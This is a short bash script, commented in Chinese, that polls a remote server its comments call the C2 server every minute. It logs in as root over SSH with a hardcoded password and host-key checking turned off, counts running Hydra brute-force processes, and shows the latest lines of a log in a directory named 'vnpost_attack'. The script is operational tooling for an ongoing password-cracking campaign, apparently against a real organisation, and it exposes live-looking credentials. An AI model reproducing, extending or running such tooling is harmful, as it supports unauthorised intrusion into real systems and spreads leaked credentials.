#!/bin/bash
# 持续监控攻击状态

while true; do
    clear
    echo "==================================="
    echo "MANGA系统持续攻击监控"
    echo "时间: $(date)"
    echo "==================================="
    
    # 检查C2服务器
    echo -e "\n[C2服务器状态]"
    sshpass -p '@admin1314@' ssh -o StrictHostKeyChecking=no -p 2233 root@82.29.71.156 \
        "ps aux | grep hydra | grep -v grep | wc -l" 2>/dev/null | \
        xargs -I {} echo "Hydra进程数: {}"
    
    # 检查最新日志
    echo -e "\n[最新进度]"
    sshpass -p '@admin1314@' ssh -o StrictHostKeyChecking=no -p 2233 root@82.29.71.156 \
        "tail -5 /root/vnpost_attack/corrected_output.log 2>/dev/null"
    
    echo -e "\n等待60秒后刷新..."
    sleep 60
done
